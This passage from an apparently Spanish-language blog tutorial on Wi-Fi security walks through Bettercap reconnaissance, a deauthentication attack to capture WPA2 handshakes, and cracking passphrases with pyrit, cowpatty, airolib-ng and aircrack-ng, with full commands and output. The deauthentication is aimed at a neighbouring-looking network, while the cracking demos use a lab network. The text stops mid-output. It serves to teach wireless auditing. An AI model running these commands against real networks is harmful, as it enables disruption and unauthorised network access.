│ &lt;span class=&quot;nt&quot;&gt;-93&lt;/span&gt; dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP         │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 6   │           │        │       │ 21:15:37 │
│ &lt;span class=&quot;nt&quot;&gt;-91&lt;/span&gt; dBm │ 28:9e:fc:0c:40:3e │ vodafone4038        │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 11  │           │        │       │ 21:15:40 │
│ &lt;span class=&quot;nt&quot;&gt;-54&lt;/span&gt; dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 6   │           │ 172 B  │       │ 21:15:37 │
│ &lt;span class=&quot;nt&quot;&gt;-88&lt;/span&gt; dBm │ 10:62:d0:f6:f7:d8 │ LowiF7D3            │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1   │           │ 267 B  │       │ 21:15:35 │
│ &lt;span class=&quot;nt&quot;&gt;-69&lt;/span&gt; dBm │ 06:b0:44:d4:16:85 │ MOVISTAR_1677       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 112 │           │        │       │ 21:15:31 │
└─────────┴───────────────────┴─────────────────────┴──────────────────┴──────────────────────┴─────┴───────────┴────────┴───────┴──────────┘

wlan0mon &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ch. 40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; / ↑ 0 B / ↓ 538 kB / 1392 pkts

 wlan0mon  »  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora bien, ¿cómo filtro el canal que me interesa?, sencillo… a través de la siguiente operación:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » wifi.recon.channel 6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto hará que ahora se nos listen las redes disponibles en el canal 6:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─────────┬───────────────────┬───────────────┬──────────────────┬─────┬────┬───────────┬────────┬───────┬──────────┐
│  RSSI   │       BSSID       │     SSID      │    Encryption    │ WPS │ Ch │ Clients ▾ │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼───────────────┼──────────────────┼─────┼────┼───────────┼────────┼───────┼──────────┤
│ &lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP   │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0 │ 6  │           │        │       │ 21:18:09 │
│ &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt; dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677 │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0 │ 6  │           │ 3.4 kB │       │ 21:18:10 │
└─────────┴───────────────────┴───────────────┴──────────────────┴─────┴────┴───────────┴────────┴───────┴──────────┘

wlan0mon &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ch. 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; / ↑ 0 B / ↓ 906 kB / 2889 pkts

 wlan0mon  » wifi.recon.channel 6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¿Qué es lo cómodo de este método?, pues que por ejemplo yo ahora viendo que la red &lt;strong&gt;MOVISTAR_1677&lt;/strong&gt; tiene el
BSSID &lt;strong&gt;1c:b0:44:d4:16:78&lt;/strong&gt;, podría hacer un ataque de de-autenticación sobre los clientes que &lt;strong&gt;Bettercap&lt;/strong&gt;
detecte en dicha red:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » wifi.deauth 1c:b0:44:d4:16:78
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obteniendo los siguientes resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » wifi.deauth 1c:b0:44:d4:16:78
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:33:26] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi deauthing client 20:34:fb:b1:c5:53 from AP MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:6 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez el cliente se reconecte a la red:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:33:13] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.probe] station da:a1:19:8b:d9:82 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Google, Inc.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is probing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SSID MOVISTAR_DF12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-38&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:33:15] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.probe] station 20:34:fb:b1:c5:53 is probing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SSID MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-40&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:33:15] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured 20:34:fb:b1:c5:53 -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:33:15] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured 20:34:fb:b1:c5:53 -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; WPA2 handshake to /root/bettercap-wifi-handshakes.pcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Se genera el Handshake y este es exportado automáticamente al fichero indicado desde el verbose de la
 herramienta. Si analizamos con &lt;strong&gt;pyrit&lt;/strong&gt;, vemos que efectivamente… se ha capturado un Handshake por parte
 de dicha estación:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌─[root@parrot]─[/opt/bettercap]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -r /root/bettercap-wifi-handshakes.pcap analyze&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'/root/bettercap-wifi-handshakes.pcap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 7 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#1: Station 20:34:fb:b1:c5:53, 4 handshake(s):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#1: HMAC_SHA1_AES, good, spread 1&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#2: HMAC_SHA1_AES, good, spread 1&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#3: HMAC_SHA1_AES, good, spread 2&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#4: HMAC_SHA1_AES, good, spread 2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;técnicas-de-aumento-de-la-velocidad-de-cómputo&quot;&gt;Técnicas de aumento de la velocidad de cómputo&lt;/h3&gt;

&lt;p&gt;Si bien es cierto que considero que la velocidad de cómputo de mi ordenador es bastante aceptable
(7.000/10.000 contraseñas por segundo), ¿hay alguna forma de ir más rápido aún?, ¿hay alguna forma de
multiplicar por 1.000 la velocidad si ser necesario un ordenador de altos requisitos?, la respuesta es si.&lt;/p&gt;

&lt;p&gt;A la hora de iniciar el proceso de fuerza bruta con &lt;strong&gt;aircrack&lt;/strong&gt;, por ejemplo, estamos llevando a cabo varios pasos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Filtrado de la captura para extraer el Hash (Handshake)&lt;/li&gt;
  &lt;li&gt;Lectura de diccionario (CCMP por cada contraseña en texto claro)&lt;/li&gt;
  &lt;li&gt;Comparativa del Hash resultante con el Handshake capturado&lt;/li&gt;
  &lt;li&gt;True/False (Si hay Match, es que esa es la contraseña)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;¿No has pensado en que todos estos pasos se podrían omitir, si contásemos con un diccionario de claves ya
precomputadas?. Me explico, ¿y si en vez de tener un diccionario de contraseñas en texto claro, tenemos un
diccionario de contraseñas ya pre-computadas con sus respectivos hashes?, fijaros que ahora sería simplemente
hacer los siguientes pasos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Lectura de la clave PMK del diccionario&lt;/li&gt;
  &lt;li&gt;True/False (Match con el Handshake)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Esta reducción de pasos es equivalente a la velocidad del tiempo de cómputo, es decir, es mucho menor. Lo
iremos viendo poco a poco, pero primero un poco de cultura :)&lt;/p&gt;

&lt;h4 id=&quot;concepto-de-rainbow-table&quot;&gt;Concepto de Rainbow Table&lt;/h4&gt;

&lt;p&gt;Hoy las contraseñas ya no se guardan sin cifrar –o eso se espera. Cuando los usuarios de una plataforma fijan
una clave de acceso para su cuenta, esta secuencia de caracteres no aparece en texto plano en una base de
datos en algún servidor, puesto que no sería seguro: si encontrara la forma de entrar en ella, un hacker lo
tendría muy fácil para acceder a todas las cuentas de un determinado usuario.&lt;/p&gt;

&lt;p&gt;Para el eCommerce, la banca en línea o los servicios gubernamentales online esto tendría consecuencias
fatales. En lugar de ello, los servicios online utilizan diversos mecanismos criptográficos para cifrar las
contraseñas de sus usuarios de modo que en las bases de datos solo aparezca un valor hash (valor resumen) de
la clave.&lt;/p&gt;

&lt;p&gt;Incluso conociendo la función criptográfica que lo ha originado, desde este valor hash no es posible deducir
la contraseña, porque no es posible reconstruir el procedimiento a la inversa. Esto lleva a los
ciberdelincuentes a recurrir a los ataques de fuerza bruta, en los cuales un programa informático intenta
“adivinar” la secuencia correcta de caracteres que constituye la contraseña durante tanto tiempo como haga
falta.&lt;/p&gt;

&lt;p&gt;Este método puede combinarse con los llamados “diccionarios” de contraseñas. En estos archivos, que circulan
libremente en Internet, pueden encontrarse numerosas contraseñas que bien son muy populares o ya fueron
interceptadas en el pasado.&lt;/p&gt;

&lt;p&gt;Los hackers tienden a probar primero todas las contraseñas del diccionario, lo que les permite ahorrar tiempo,
aunque, en función de la complejidad de las contraseñas (longitud y tipo de caracteres), este proceso puede
resultar más largo y consumir más recursos de lo esperado.&lt;/p&gt;

&lt;p&gt;También disponibles en la Red y también un recurso para descifrar claves secretas, las tablas rainbow van un
paso más allá de los diccionarios. Estos ficheros, que pueden llegar a tener un tamaño de varios cientos de
gigabytes, contienen un listado de claves junto con sus valores hash, pero de forma incompleta: para reducir
su tamaño y así su necesidad de espacio en memoria, se crean cadenas de valores a partir de las cuales pueden
reconstruirse fácilmente los demás valores. Con estas tablas los valores hash encontrados en un banco de datos
pueden ordenarse con sus claves en texto plano.&lt;/p&gt;

&lt;p&gt;Un ejemplo claro: https://hashkiller.co.uk/&lt;/p&gt;

&lt;h4 id=&quot;cracking-con-pyrit&quot;&gt;Cracking con Pyrit&lt;/h4&gt;

&lt;p&gt;Dicho esto y aunque todavía no vamos a meternos del todo con las &lt;strong&gt;Rainbow Tables&lt;/strong&gt;, empecemos viendo cómo
podemos hacer uso de &lt;strong&gt;Pyrit&lt;/strong&gt; para crackear contraseñas a través de ataques por diccionario. Primero veremos
el método convencional y más tarde lo combinaremos con una Rainbow Table.&lt;/p&gt;

&lt;p&gt;Una vez capturado un Handshake, podemos hacer uso de Pyrit para crackear la contraseña de la red inalámbrica,
de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'Captura-01.cap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 43 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;43 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El modo &lt;strong&gt;attack_passthrough&lt;/strong&gt; lo que se encarga es de atacar a un handshake capturado por medio de un ataque
de fuerza bruta, usando el diccionario especificado a través del parámetro ‘&lt;strong&gt;-r&lt;/strong&gt;’.&lt;/p&gt;

&lt;p&gt;Una vez obtenida la contraseña:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'Captura-01.cap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 43 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;43 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
Tried 40002 PMKs so far&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2466 PMKs per second. 123hello9

The password is &lt;span class=&quot;s1&quot;&gt;'hottie4u'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nos fijamos… &lt;strong&gt;2.466 PMKs por segundo&lt;/strong&gt;, lo cual es bastante triste considerando la velocidad de
&lt;strong&gt;aircrack&lt;/strong&gt;, pero no nos preocupemos, a pesar de que ahora estamos decepcionados, más adelante nos
sorprenderá.&lt;/p&gt;

&lt;h4 id=&quot;cracking-con-cowpatty&quot;&gt;Cracking con Cowpatty&lt;/h4&gt;

&lt;p&gt;El uso de &lt;strong&gt;Cowpatty&lt;/strong&gt; para emplear un ataque de fuerza bruta es el siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#cowpatty -f diccionario -r Captura-01.cap -s hacklab&lt;/span&gt;
cowpatty 4.8 - WPA-PSK dictionary attack. &amp;lt;jwright@hasborg.com&amp;gt;

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
key no. 6000: amigasporsiempre
key no. 7000: 0123654789
key no. 8000: trinitron
key no. 9000: flower22
key no. 10000: vincenzo
key no. 11000: pensacola
key no. 12000: boyracer
key no. 13000: grandmom
key no. 14000: battlefield
key no. 15000: badangel

The PSK is &lt;span class=&quot;s2&quot;&gt;&quot;hottie4u&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

15242 passphrases tested &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;24.02 seconds:  634.53 passphrases/second
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Importante destacar que siempre hay que especificar el &lt;strong&gt;ESSID&lt;/strong&gt; de la red. Como vemos, obtenemos la
contraseña pero el cómputo es incluso mucho menor… &lt;strong&gt;634 contraseñas por segundo&lt;/strong&gt;, lo mejoraremos.&lt;/p&gt;

&lt;h4 id=&quot;cracking-con-airolib&quot;&gt;Cracking con Airolib&lt;/h4&gt;

&lt;p&gt;Ahora, es cuando vamos a ir aumentando la velocidad de cómputo. &lt;strong&gt;Airolib&lt;/strong&gt; nos permite crear un diccionario
de claves pre-computadas (PMK’s), lo cual es una maravilla para el caso.&lt;/p&gt;

&lt;p&gt;Comenzaremos creando un fichero &lt;strong&gt;passwords-airolib&lt;/strong&gt;, indicando el diccionario de contraseñas a usar:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airolib-ng passwords-airolib --import passwd diccionario &lt;/span&gt;
Database &amp;lt;passwords-airolib&amp;gt; does not already exist, creating it...
Database &amp;lt;passwords-airolib&amp;gt; successfully created
Reading file...
Writing...s &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;, 45922 invalid lines ignored.
Done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, creamos un fichero que almacene el &lt;strong&gt;ESSID&lt;/strong&gt; de nuestra red y lo sincronizamos con el archivo
creado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo &quot;hacklab&quot; &amp;gt; essid.lst&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airolib-ng passwords-airolib --import essid essid.lst &lt;/span&gt;
Reading file...
Writing...
Done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A través del parámetro ‘&lt;strong&gt;–stats&lt;/strong&gt;’, podemos comprobar que está todo correctamente definido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airolib-ng passwords-airolib --stats&lt;/span&gt;
There are 1 ESSIDs and 24078 passwords &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the database. 0 out of 24078 possible combinations have been computed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

ESSID	Priority	Done
hacklab	64	0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya que &lt;strong&gt;airolib&lt;/strong&gt; trae un parámetro para limpiar el archivo (líneas no legibles o errores), lo usamos también:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airolib-ng passwords-airolib --clean all&lt;/span&gt;
Deleting invalid ESSIDs and passwords...
Deleting unreferenced PMKs...
Analysing index structure...
Vacuum-cleaning the database. This could take a &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;...
Checking database integrity...
integrity_check
ok

Done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y ya por último, hacemos uso del parámetro &lt;strong&gt;–batch&lt;/strong&gt; para generar el diccionario final de claves precomputadas:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airolib-ng passwords-airolib --batch&lt;/span&gt;
Batch processing ...
Computed 5000 PMK &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;384 PMK/s, 19078 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Computed 10000 PMK &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;24 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;416 PMK/s, 14078 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Computed 15000 PMK &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;36 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;416 PMK/s, 9078 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Computed 20000 PMK &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;48 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;416 PMK/s, 4078 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Computed 24078 PMK &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;58 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;415 PMK/s, 0 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;buffer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
All ESSID processed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez generado, atentos a la velocidad. Vamos a ver con &lt;strong&gt;aircrack&lt;/strong&gt; cuánto tardamos haciendo uso del
procedimiento tradicional:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                             Aircrack-ng 1.5.2 

      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:00:02] 22832/24078 keys tested &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9415.01 k/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 

      Time left: 0 seconds                                      94.83%

                           KEY FOUND! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; hottie4u &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;


      Master Key     : B1 42 12 E4 D4 86 FF 87 49 04 29 E3 51 E3 C6 BC 
                       C0 EA A3 03 A6 ED E3 79 A0 A4 BC D6 8F 3B 39 E3 

      Transient Key  : F7 17 BB BB 6F A3 9A E8 D5 DA E6 3E 0E C5 0B 45 
                       C8 D6 47 4B 87 12 FF A7 80 6A 44 00 05 77 CC 96 
                       35 99 2D BA 9D B0 A4 CF C2 43 CF 66 2B 74 D9 16 
                       7C ED 59 EF AE 70 5D 23 D9 7B 9E B9 38 2A 87 CC 

      EAPOL HMAC     : 7F A8 E0 CC 77 49 2C E9 51 8C 81 42 F9 DB CE E0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Valores clave:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;9.415 contraseñas por segundo&lt;/li&gt;
  &lt;li&gt;2 segundos hasta dar con la contraseña&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora bien, hagamos uso de aircrack para crackear nuevamente la contraseña, pero esta vez con una sintaxis que
toma como input el fichero creado con &lt;strong&gt;airolib&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aircrack-ng -r passwords-airolib Captura-01.cap&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obtenemos los siguientes resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#aircrack-ng -r passwordsAircrack-ng 1.5.2 1.cap&lt;/span&gt;

      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:00:00] 15241/0 keys tested &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;204456.39 k/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 

      Time left: 

                           KEY FOUND! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; hottie4u &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;


      Master Key     : 24 87 02 AB 54 4E 47 C1 C0 DC DE E9 DF 7D 22 88 
                       80 C4 F0 07 F9 04 B8 71 B7 72 2A F1 04 75 57 99 

      Transient Key  : 21 6C FB DC 6B D0 98 59 99 F1 A3 1A B2 CF 9D 67 
                       E2 6C DA 3C CC 50 B2 60 9B 65 D3 B1 94 DA B4 AB 
                       92 62 DB 80 C5 CB DA 15 A5 04 D3 C7 5B A2 FD 8F 
                       87 36 0A 3A 99 45 14 A2 61 8D 3B 90 44 53 6A A4 

